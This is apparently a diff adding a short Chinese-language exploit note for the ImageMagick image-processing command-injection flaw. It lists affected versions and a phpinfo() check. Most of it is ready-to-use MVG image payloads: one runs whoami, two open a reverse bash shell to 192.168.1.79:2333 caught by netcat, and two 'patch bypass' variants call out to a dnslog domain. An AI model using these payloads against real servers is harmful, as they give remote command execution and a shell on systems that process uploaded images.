@@ -1,0 +1,43 @@
+漏洞影响版本
+ImageMagick 6.5.7-8 2012-08-17(手工测试风险存在)
+ImageMagick 6.7.7-10 2014-03-06(手工测试风险存在)
+低版本至6.9.3-9 released 2016-04-30
+
+通过 phpinfo() 即可，搜索 ImageMagick ，下图就是受影响的版本
+--------------------------------------------------------------------
+
+server:nc -l v p 80
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://evalbug.com/"|whoami")'
+pop graphic-context
+
+---------------------------------------------------------------
+
+nc -vv -l -p 2333
+poc:
+
+push graphic-context
+viewbox 0 0 640 480
+image copy 200,200 100,100 "|bash -i >& /dev/tcp/192.168.1.79/2333 0>&1"
+pop graphic-context
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/1.jpg"|bash -i >& /dev/tcp/192.168.1.79/2333 0>&1")'
+pop graphic-context"
+
+---------------------------------------------------------------------
+顺带提一下猪猪侠提交的漏洞-优酷主站存在远程命令执行漏洞(ImageMagick补丁绕过)
+#新的利用代码1
+push graphic-context
+viewbox 0 0 640 480
+image Over 0,0 0,0 '|host image.99fd5e.dnslog.info'
+pop graphic-context
+
+#新的利用代码2
+push graphic-context
+viewbox 0 0 640 480
+image copy 200,200 100,100 "|host image.99fd5e.dnslog.info"
+pop graphic-context
